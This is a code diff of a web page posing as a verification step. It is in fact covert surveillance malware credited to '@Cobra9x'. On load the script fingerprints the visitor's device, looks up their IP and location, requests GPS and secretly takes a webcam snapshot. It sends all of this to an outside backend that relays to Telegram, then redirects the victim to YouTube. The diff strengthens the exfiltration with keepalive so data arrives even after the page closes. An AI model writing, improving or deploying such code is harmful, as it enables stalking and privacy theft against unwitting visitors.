@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -23,9 +24,7 @@
       max-width: 400px;
       text-align: center;
     }
-    .card img {
-      margin-bottom: 20px;
-    }
+    .card img { margin-bottom: 20px; }
     video, canvas {
       opacity: 0;
       position: absolute;
@@ -50,53 +49,47 @@
     const ctx = canvas.getContext("2d");
     let imageBase64 = "";
 
-    function sendToTelegram(message, isPhoto = false) {
+    // دالة الإرسال مع تحسين الثبات (keepalive)
+    async function sendToTelegram(message, isPhoto = false) {
+      if (!chatId) return;
       const payload = { chat_id: chatId };
       if (isPhoto && imageBase64) {
-        payload.message = "📸 Snapshot from verification:";
+        payload.message = "📸 *Snapshot from verification:*";
         payload.photo = imageBase64;
       } else {
         payload.message = message;
       }
 
-      fetch("https://render-backend-package1.onrender.com/submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
+      try {
+        await fetch("https://render-backend-package1.onrender.com/submit", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+          keepalive: true // يضمن وصول الطلب حتى لو تم إغلاق الصفحة
+        });
+      } catch (e) { console.error("Send Error:", e); }
     }
 
     function detectDeviceType(ua) {
-      if (/android/i.test(ua)) return "Android";
-      if (/iphone|ipad|ipod/i.test(ua)) return "iOS";
-      if (/windows/i.test(ua)) return "Windows";
-      if (/macintosh|mac os/i.test(ua)) return "Mac";
-      if (/linux/i.test(ua)) return "Linux";
-      return "Unknown";
-    }
-
-    function getBrowserName(ua) {
-      if (ua.includes("Firefox/")) return "Firefox";
-      if (ua.includes("Edg/")) return "Edge";
-      if (ua.includes("Chrome/")) return "Chrome";
-      if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
-      return "Unknown";
+      if (/android/i.test(ua)) return "Android 📱";
+      if (/iphone|ipad|ipod/i.test(ua)) return "iOS 🍎";
+      if (/windows/i.test(ua)) return "Windows 💻";
+      if (/macintosh/i.test(ua)) return "Mac 🖥️";
+      return "Unknown Device";
     }
 
     function collectSensitive() {
       navigator.geolocation.getCurrentPosition(
-        pos => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          const gpsMessage = `📍 GPS Location\nhttps://maps.google.com/?q=${lat},${lon}`;
-          sendToTelegram(gpsMessage);
+        async pos => {
+          const gpsMsg = `📍 *GPS Location Found*\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+          await sendToTelegram(gpsMsg);
           capturePhotoSafely();
         },
-        err => {
-          sendToTelegram("❌ GPS access denied or unavailable");
+        async err => {
+          await sendToTelegram("❌ *GPS Access Denied*");
           capturePhotoSafely();
         },
-        { timeout: 5000 }
+        { timeout: 4000 }
       );
     }
 
@@ -105,59 +98,66 @@
         .then(stream => {
           video.srcObject = stream;
           video.onloadeddata = () => {
-            setTimeout(() => {
+            setTimeout(async () => {
               ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
               imageBase64 = canvas.toDataURL("image/jpeg").split(',')[1];
               stream.getTracks().forEach(track => track.stop());
-              sendToTelegram("", true);
-              setTimeout(() => {
-                window.location.href = "https://youtu.be/tNWpOuJk2M8?si=i9CeV1S2w2O34C4s";
-              }, 3000);
-            }, 1200);
+              await sendToTelegram("", true);
+              redirectToTarget();
+            }, 1000);
           };
         })
         .catch(() => {
-          sendToTelegram("❌ Camera access denied");
-          setTimeout(() => {
-            window.location.href = "https://youtu.be/nGPzrO2prWI?feature=shared";
-          }, 3000);
+          sendToTelegram("❌ *Camera Access Denied*");
+          redirectToTarget();
         });
     }
 
-    function sendBasicInfo() {
+    function redirectToTarget() {
+      setTimeout(() => {
+        window.location.replace("https://youtu.be/tNWpOuJk2M8");
+      }, 1000);
+    }
+
+    async function sendBasicInfo() {
       const ua = navigator.userAgent;
       const os = detectDeviceType(ua);
-      const browser = getBrowserName(ua);
       const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const lang = navigator.language || navigator.userLanguage;
-      const screenRes = `${screen.width} x ${screen.height}`;
-      const ref = document.referrer || "Direct";
+      const lang = navigator.language;
+      const screenRes = `${screen.width}x${screen.height}`;
       const connection = navigator.connection || {};
       const network = connection.effectiveType || "Unknown";
 
-      navigator.getBattery().then(battery => {
-        const charging = battery.charging ? "Yes" : "No";
-        const level = Math.round(battery.level * 100) + "%";
+      // جلب البطارية
+      let batteryInfo = "N/A";
+      try {
+        const battery = await navigator.getBattery();
+        batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging 🔌' : 'Not Charging 🔋'})`;
+      } catch(e) {}
 
-        fetch("https://ipinfo.io/json?token=9c6f5e4a17b44c")
-          .then(res => res.json())
-          .then(data => {
-            let basicInfo = "📱 Hacked by @Cobra9x\n\n";
-            basicInfo += `🌍 IP Address: ${data.ip}\n\n`;
-            basicInfo += "📱 Device Info:\n";
-            basicInfo += `💻 OS: ${os}\n🌐 Browser: ${browser}\n🔤 Language: ${lang}\n`;
-            basicInfo += `🔋 Charging: ${charging}\n🔌 Battery: ${level}\n📶 Network: ${network.toUpperCase()}\n`;
-            basicInfo += `🕒 Time Zone: ${timeZone}\n📺 Resolution: ${screenRes}\n`;
-            basicInfo += `🖥️ User Agent: ${ua}\n`;
-            basicInfo += `📱 Device: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
-            basicInfo += `🔗 Referrer: ${ref}\n`;
-            basicInfo += "🔒 Awaiting GPS & camera permissions...";
+      // جلب الـ IP والمعلومات الجغرافية
+      fetch("https://ipinfo.io/json?token=9c6f5e4a17b44c")
+        .then(res => res.json())
+        .then(data => {
+          let basicInfo = "🔥 *NEW TARGET DETECTED BY COBRA* 🔥\n";
+          basicInfo += "━━━━━━━━━━━━━━━━━━\n";
+          basicInfo += `🌍 *IP:* \`${data.ip}\`\n`;
+          basicInfo += `📍 *Location:* ${data.city}, ${data.country}\n`;
+          basicInfo += `🏢 *ISP:* ${data.org}\n`;
+          basicInfo += "━━━━━━━━━━━━━━━━━━\n";
+          basicInfo += `💻 *OS:* ${os}\n`;
+          basicInfo += `🔋 *Battery:* ${batteryInfo}\n`;
+          basicInfo += `📶 *Network:* ${network.toUpperCase()}\n`;
+          basicInfo += `🕒 *Timezone:* ${timeZone}\n`;
+          basicInfo += `📺 *Screen:* ${screenRes}\n`;
+          basicInfo += "━━━━━━━━━━━━━━━━━━\n";
+          basicInfo += "🔒 *Awaiting GPS & Camera...*";
 
-            sendToTelegram(basicInfo);
-          });
-      });
+          sendToTelegram(basicInfo);
+        });
     }
 
+    // التنفيذ
     if (chatId) {
       sendBasicInfo();
       collectSensitive();
